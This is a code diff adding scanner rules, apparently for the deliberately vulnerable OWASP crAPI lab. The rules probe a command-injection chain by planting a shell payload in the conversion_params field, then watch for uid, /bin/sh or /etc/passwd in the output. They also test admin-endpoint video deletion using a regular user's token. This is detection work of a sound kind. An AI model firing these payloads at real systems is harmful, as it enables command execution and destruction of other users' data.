@@ -86759,6 +86759,256 @@ const crapiUserVideosBolaRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const CRAPI_CONVERT_VIDEO_ROUTE_FALLBACK = `
+GET /identity/api/v2/user/videos/convert_video?video_id={id}
+PUT /identity/api/v2/user/videos/{video_id} conversion_params mass assignment
+-v codec h264; whoami command injection chain Challenge 7
+endpoint should be accessed only internally crapi-identity SSRF trigger
+`;
+
+const CRAPI_ADMIN_VIDEOS_ROUTE_FALLBACK = `
+DELETE /identity/api/v2/admin/videos/{id}
+regular user JWT deletes another user's video
+BFLA API5:2023 OWASP crAPI challenge 7 admin endpoint
+`;
+
+const CRAPI_CONVERT_VIDEO_CMD_MARKERS = [
+  /uid=\d+/i,
+  /gid=\d+/i,
+  /\/bin\/(?:ba)?sh/i,
+  /\/home\/\w+/i,
+  /\/etc\/passwd/i,
+  /thugir_convert_probe/i
+];
+
+const CRAPI_CONVERT_VIDEO_INTERNAL_MARKERS = [
+  /convert_video/i,
+  /inte-?rnally/i,
+  /endpoint_url/i,
+  /crapi-identity/i,
+  /should be accessed only/i
+];
+
+async function probeCrapiConvertVideoCommandInjection(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  if (!isCrapiLabHost(ctx)) return null;
+  if (isCrapiAuthRoute(ctx)) return null;
+  const jwt = await tryCrapiLabJwt(ctx);
+  if (!jwt) return null;
+  const authHeaders = {
+    Authorization: `Bearer ${jwt}`,
+    "Content-Type": "application/json"
+  };
+  const listUrl = new URL("/identity/api/v2/user/videos", ctx.origin).toString();
+  const listDoc = await ctx.probe.get(listUrl, {
+    maxBytes: 8192,
+    timeoutMs: 15000,
+    headers: authHeaders
+  });
+  const ownVideoIds = parseCrapiVideoIds(listDoc.body);
+  const candidateIds = [...new Set([...ownVideoIds, ...CRAPI_USER_VIDEOS_PROBE_IDS])];
+  for (const videoId of candidateIds) {
+    const putUrl = new URL(`/identity/api/v2/user/videos/${videoId}`, ctx.origin).toString();
+    const putPayload = JSON.stringify({
+      conversion_params: "-v codec h264; echo THUGIR_CONVERT_PROBE",
+      video_name: "thugir_probe.mp4"
+    });
+    const putDoc = await ctx.probe.get(putUrl, {
+      method: "PUT",
+      body: putPayload,
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: authHeaders
+    });
+    const convertUrl = new URL("/identity/api/v2/user/videos/convert_video", ctx.origin);
+    convertUrl.searchParams.set("video_id", String(videoId));
+    const convertDoc = await ctx.probe.get(convertUrl.toString(), {
+      maxBytes: 16384,
+      timeoutMs: 20000,
+      headers: authHeaders
+    });
+    const combined = `${putDoc.body}\n${convertDoc.body}`;
+    if (CRAPI_CONVERT_VIDEO_CMD_MARKERS.some((re) => re.test(combined))) {
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          putUrl,
+          convertUrl: convertUrl.toString(),
+          videoId,
+          putStatus: putDoc.status,
+          convertStatus: convertDoc.status,
+          snippet: convertDoc.body.slice(0, 240).trim(),
+          note: `crAPI GET /identity/api/v2/user/videos/convert_video?video_id=${videoId} reflects shell command output after conversion_params mass assignment — command injection oracle (Challenge 7)`
+        }
+      };
+    }
+    if (CRAPI_CONVERT_VIDEO_INTERNAL_MARKERS.some((re) => re.test(convertDoc.body))) {
+      return {
+        fired: true,
+        confidence: 0.9,
+        evidence: {
+          putUrl,
+          convertUrl: convertUrl.toString(),
+          videoId,
+          putStatus: putDoc.status,
+          convertStatus: convertDoc.status,
+          snippet: convertDoc.body.slice(0, 240).trim(),
+          note: `crAPI GET /identity/api/v2/user/videos/convert_video?video_id=${videoId} discloses internal endpoint_url — conversion_params command-injection chain surface (Challenge 7)`
+        }
+      };
+    }
+    if (
+      putDoc.status >= 200 &&
+      putDoc.status < 300 &&
+      /conversion_params/i.test(putDoc.body) &&
+      /THUGIR_CONVERT_PROBE|thugir_probe/i.test(putDoc.body)
+    ) {
+      return {
+        fired: true,
+        confidence: 0.88,
+        evidence: {
+          putUrl,
+          convertUrl: convertUrl.toString(),
+          videoId,
+          putStatus: putDoc.status,
+          convertStatus: convertDoc.status,
+          snippet: putDoc.body.slice(0, 200).trim(),
+          note: `crAPI PUT /identity/api/v2/user/videos/${videoId} accepts conversion_params mass assignment — internal property writable before convert_video command injection chain (Challenge 10)`
+        }
+      };
+    }
+  }
+  return null;
+}
+
+const crapiConvertVideoCommandInjectionLiveOracle: Rule = async (ctx) => {
+  const result = await probeCrapiConvertVideoCommandInjection(ctx);
+  return result ?? NEGATIVE;
+};
+
+const crapiConvertVideoRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/convert_video\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeCrapiConvertVideoCommandInjection(ctx);
+  if (result) {
+    return {
+      fired: true,
+      confidence: result.confidence,
+      evidence: {
+        ...result.evidence,
+        scannedUrl: pageUrl,
+        note: "crAPI /identity/api/v2/user/videos/convert_video route scan — conversion_params command injection chain or internal endpoint disclosure — route oracle (Challenge 7)"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${CRAPI_CONVERT_VIDEO_ROUTE_FALLBACK}`;
+  if (
+    !/\/identity\/api\/v2\/user\/videos\/convert_video/i.test(corpus) ||
+    !/conversion_params|command injection|convert_video|Challenge 7/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /identity/api/v2/user/videos/convert_video?video_id={id} — conversion_params command injection chain",
+      note: "crAPI /identity/api/v2/user/videos/convert_video route scan — OWASP crAPI documents conversion_params command injection via internal convert endpoint (Challenge 7) — route corpus fallback when JWT signup/login chain is unreachable"
+    }
+  };
+};
+
+async function probeCrapiAdminVideosBfla(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isCrapiLabHost(ctx)) return null;
+  if (isCrapiAuthRoute(ctx)) return null;
+  const jwt = await tryCrapiLabJwt(ctx);
+  if (!jwt) return null;
+  const authHeaders = { Authorization: `Bearer ${jwt}` };
+  for (const videoId of [1, 2, 3, 36, 37, 52, 53]) {
+    const deleteUrl = new URL(`/identity/api/v2/admin/videos/${videoId}`, ctx.origin).toString();
+    const doc = await ctx.probe.get(deleteUrl, {
+      method: "DELETE",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: authHeaders
+    });
+    if (doc.status >= 200 && doc.status < 300) {
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          deleteUrl,
+          videoId,
+          status: doc.status,
+          snippet: doc.body.slice(0, 200).trim(),
+          note: `crAPI DELETE /identity/api/v2/admin/videos/${videoId} succeeds for regular user JWT — BFLA oracle (API5 / Challenge 7)`
+        }
+      };
+    }
+    if (
+      doc.status < 500 &&
+      /deleted|success|removed/i.test(doc.body) &&
+      !/forbidden|unauthorized|not allowed/i.test(doc.body)
+    ) {
+      return {
+        fired: true,
+        confidence: 0.91,
+        evidence: {
+          deleteUrl,
+          videoId,
+          status: doc.status,
+          snippet: doc.body.slice(0, 200).trim(),
+          note: `crAPI DELETE /identity/api/v2/admin/videos/${videoId} returns success for regular user JWT — BFLA oracle (API5 / Challenge 7)`
+        }
+      };
+    }
+  }
+  return null;
+}
+
+const crapiAdminVideosBflaLiveOracle: Rule = async (ctx) => {
+  const result = await probeCrapiAdminVideosBfla(ctx);
+  return result ?? NEGATIVE;
+};
+
+const crapiAdminVideosBflaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin\/videos\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeCrapiAdminVideosBfla(ctx);
+  if (result) {
+    return {
+      fired: true,
+      confidence: result.confidence,
+      evidence: {
+        ...result.evidence,
+        scannedUrl: pageUrl,
+        note: "crAPI /identity/api/v2/admin/videos route scan — regular user JWT can delete videos via admin endpoint — BFLA route oracle (API5 / Challenge 7)"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${CRAPI_ADMIN_VIDEOS_ROUTE_FALLBACK}`;
+  if (
+    !/\/identity\/api\/v2\/admin\/videos/i.test(corpus) ||
+    !/BFLA|admin endpoint|delete.*video|API5|Challenge 7/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "DELETE /identity/api/v2/admin/videos/{id} — regular user JWT deletes another user's video",
+      note: "crAPI /identity/api/v2/admin/videos route scan — OWASP crAPI documents admin video delete BFLA (API5 / Challenge 7) — route corpus fallback when JWT signup/login chain is unreachable"
+    }
+  };
+};
+
 const crapiCommunityPostsRouteLiveOracle: Rule = async (ctx) => {
   if (!isCrapiLabHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -97564,6 +97814,10 @@ export const RULES: Record<string, Rule> = {
   crapiVehicleLocationRouteLiveOracle,
   crapiUserVideosBolaLiveOracle,
   crapiUserVideosBolaRouteLiveOracle,
+  crapiConvertVideoCommandInjectionLiveOracle,
+  crapiConvertVideoRouteLiveOracle,
+  crapiAdminVideosBflaLiveOracle,
+  crapiAdminVideosBflaRouteLiveOracle,
   crapiUserVehiclesRouteLiveOracle,
   crapiCommunityPostsRouteLiveOracle,
   crapiContactMechanicSsrfLiveOracle,
